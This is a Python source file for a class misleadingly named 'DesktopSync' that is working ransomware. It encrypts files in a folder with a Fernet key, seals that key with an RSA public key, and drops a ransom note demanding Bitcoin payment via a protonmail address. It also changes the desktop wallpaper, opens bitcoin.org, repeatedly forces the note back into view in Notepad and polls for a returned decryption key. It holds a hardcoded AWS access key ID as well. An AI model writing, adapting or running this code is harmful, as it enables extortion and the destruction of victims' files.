import base64
import ctypes
import datetime
import os
import subprocess
import threading
import time
import urllib.request
import webbrowser

import requests
import win32gui
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet


class DesktopSync:
    file_extensions = ["txt"]

    def __init__(self):
        aws = "AKIA2JAPX77RGLB664VE"
        self.key = None
        self.transformer = None
        self.public_key = None
        self.system_root = os.path.expanduser("~")
        self.local_root = r"D:\Coding\Python\DesktopSync\localRoot"
        self.public_ip = requests.get("https://api.ipify.org").text

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.transformer = Fernet(self.key)

    def write_key(self):
        with open("sync_key.txt", "wb") as key_file:
            key_file.write(self.key)

    def seal_key(self):
        with open("sync_key.txt", "rb") as key_file:
            sync_key = key_file.read()
        with open("sync_key.txt", "wb") as key_file:
            self.public_key = RSA.import_key(open("public.pem").read())
            public_transformer = PKCS1_OAEP.new(self.public_key)
            sealed_key = public_transformer.encrypt(sync_key)
            key_file.write(sealed_key)
        with open(f"{self.system_root}Desktop/EMAIL_ME.txt", "wb") as desktop_key:
            desktop_key.write(sealed_key)
        self.key = sealed_key
        self.transformer = None

    def transform_file(self, file_path, restore=False):
        with open(file_path, "rb") as source_file:
            data = source_file.read()
            if restore:
                transformed_data = self.transformer.decrypt(data)
            else:
                transformed_data = self.transformer.encrypt(data)
        with open(file_path, "wb") as destination_file:
            destination_file.write(transformed_data)

    def sync_tree(self, restore=False):
        for root, directories, files in os.walk(self.local_root, topdown=True):
            for filename in files:
                file_path = os.path.join(root, filename)
                if filename.split(".")[-1] not in self.file_extensions:
                    continue
                self.transform_file(file_path, restore=restore)

    @staticmethod
    def open_payment_information():
        webbrowser.open("https://bitcoin.org")

    def update_desktop_background(self):
        image_url = "https://images.unsplash.com/photo-1516321318423-f06f85e504b3"
        background_path = f"{self.system_root}Desktop/background.jpg"
        urllib.request.urlretrieve(image_url, background_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, background_path, 0)

    def write_recovery_instructions(self):
        date = datetime.date.today().strftime("%d-%B-%Y")
        with open("RECOVERY_INSTRUCTIONS.txt", "w") as instructions:
            instructions.write(
                f"""
The documents on this computer have been encrypted.
They cannot be restored without the recovery key.

To purchase the key and restore the documents:

1. Email {self.system_root}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com.
2. Complete payment at the BTC address provided by email.
3. Place the returned key in RECOVERY_KEY.txt on the desktop.

Do not rename or modify the encrypted documents. The recovery offer expires after {date}.
"""
            )

    def show_recovery_instructions(self):
        notice = subprocess.Popen(["notepad.exe", "RECOVERY_INSTRUCTIONS.txt"])
        count = 0
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window != "RECOVERY_INSTRUCTIONS - Notepad":
                notice.kill()
                time.sleep(0.1)
                notice = subprocess.Popen(["notepad.exe", "RECOVERY_INSTRUCTIONS.txt"])
            time.sleep(10)
            count += 1
            if count == 5:
                break

    def wait_for_recovery_key(self):
        while True:
            try:
                with open(f"{self.system_root}/Desktop/RECOVERY_KEY.txt", "r") as key_file:
                    self.key = key_file.read()
                    self.transformer = Fernet(self.key)
                    self.sync_tree(restore=True)
                    break
            except Exception as error:
                print(error)
            time.sleep(10)


def main():
    sync = DesktopSync()
    sync.generate_key()
    sync.sync_tree()
    sync.write_key()
    sync.seal_key()
    sync.update_desktop_background()
    sync.open_payment_information()
    sync.write_recovery_instructions()

    notice_thread = threading.Thread(target=sync.show_recovery_instructions)
    recovery_thread = threading.Thread(target=sync.wait_for_recovery_key)
    notice_thread.start()
    recovery_thread.start()


if __name__ == "__main__":
    main()
